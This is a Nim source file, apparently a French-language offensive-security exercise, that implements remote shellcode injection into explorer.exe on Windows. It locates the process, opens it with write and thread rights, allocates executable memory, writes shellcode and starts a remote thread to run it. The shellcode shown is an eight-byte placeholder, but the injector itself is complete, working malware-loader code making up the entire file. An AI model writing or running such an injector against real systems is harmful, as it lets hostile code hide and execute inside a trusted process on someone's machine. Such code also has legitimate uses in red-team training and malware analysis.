import winim          
import strformat
import strutils

# ==============================================
# EXERCICE 2 : INJECTION À DISTANCE
# ==============================================

# --- Configuration ---
const TARGET_PROCESS = "explorer.exe"

# --- Shellcode factice pour test ---
var shellcode: array[8, byte] = [
  byte 0xFC, 0x48, 0x83, 0xE4, 
  0xF0, 0xE8, 0xC0, 0x00
]

# --- Trouver le PID d'un processus ---
proc findProcessByName(processName: string): DWORD =
  echo fmt"[*] Recherche du processus '{processName}'..."
  
  # Créer un snapshot de tous les processus
  let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if hSnapshot == INVALID_HANDLE_VALUE:
    echo "[-] Erreur CreateToolhelp32Snapshot"
    return 0
  
  defer: CloseHandle(hSnapshot)
  
  # Structure pour stocker les infos processus
  var pe32: PROCESSENTRY32
  pe32.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  
  # Parcourir tous les processus
  if Process32First(hSnapshot, addr pe32):
    while true:
      # Convertir le nom en string Nim
      var exeName = $cast[cstring](addr pe32.szExeFile[0])
      
      # Comparer avec le nom recherché (case-insensitive)
      if exeName.toLowerAscii() == processName.toLowerAscii():
        echo fmt"[+] Processus trouvé : PID = {pe32.th32ProcessID}"
        return pe32.th32ProcessID
      
      # Processus suivant
      if not Process32Next(hSnapshot, addr pe32):
        break
  
  echo "[-] Processus introuvable"
  return 0

# --- Fonction principale d'injection ---
proc injectRemote[I, T](shellcode: var array[I, T], processName: string): bool =
  echo fmt"[*] Début injection dans {processName}"
  
  # 1. Trouver le PID
  let pid = findProcessByName(processName)
  if pid == 0:
    return false
  
  echo fmt"[*] PID cible : {pid}"
  
  # 2. Ouvrir le processus avec droits d'écriture
  let hProcess = OpenProcess(
    PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or 
    PROCESS_VM_WRITE or PROCESS_VM_READ,
    FALSE,
    pid
  )
  
  if hProcess == 0:
    echo "[-] Erreur OpenProcess - Droits insuffisants ?"
    return false
  
  defer: CloseHandle(hProcess)
  echo "[+] Handle processus obtenu"
  
  # 3. Allouer de la mémoire dans le processus distant
  let remoteMemory = VirtualAllocEx(
    hProcess,
    nil,
    cast[SIZE_T](shellcode.len),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )
  
  if remoteMemory == nil:
    echo "[-] Erreur VirtualAllocEx"
    return false
  
  echo fmt"[+] Mémoire allouée à 0x{cast[int](remoteMemory):X}"
  
  # 4. Écrire le shellcode dans la mémoire distante
  var bytesWritten: SIZE_T
  let writeSuccess = WriteProcessMemory(
    hProcess,
    remoteMemory,
    shellcode[0].addr,
    cast[SIZE_T](shellcode.len),
    addr bytesWritten
  )
  
  if writeSuccess == 0 or bytesWritten != cast[SIZE_T](shellcode.len):
    echo "[-] Erreur WriteProcessMemory"
    return false
  
  echo fmt"[+] {bytesWritten} bytes écrits"
  
  # 5. Créer un thread distant pour exécuter le shellcode
  var threadId: DWORD
  let hThread = CreateRemoteThread(
    hProcess,
    nil,
    0,
    cast[LPTHREAD_START_ROUTINE](remoteMemory),
    nil,
    0,
    addr threadId
  )
  
  if hThread == 0:
    echo "[-] Erreur CreateRemoteThread"
    return false
  
  defer: CloseHandle(hThread)
  echo fmt"[+] Thread créé : TID = {threadId}"
  
  # 6. Attendre la fin du thread (optionnel)
  echo "[*] Attente fin exécution..."
  discard WaitForSingleObject(hThread, INFINITE)
  
  echo "[+] Injection réussie !"
  return true

# --- Point d'entrée ---
when isMainModule:
  echo "=== INJECTOR v1 - TEST STRUCTURE ==="
  
  let success = injectRemote(shellcode, TARGET_PROCESS)
  
  if success:
    echo "[+] Injection réussie"
  else:
    echo "[-] Injection échouée"
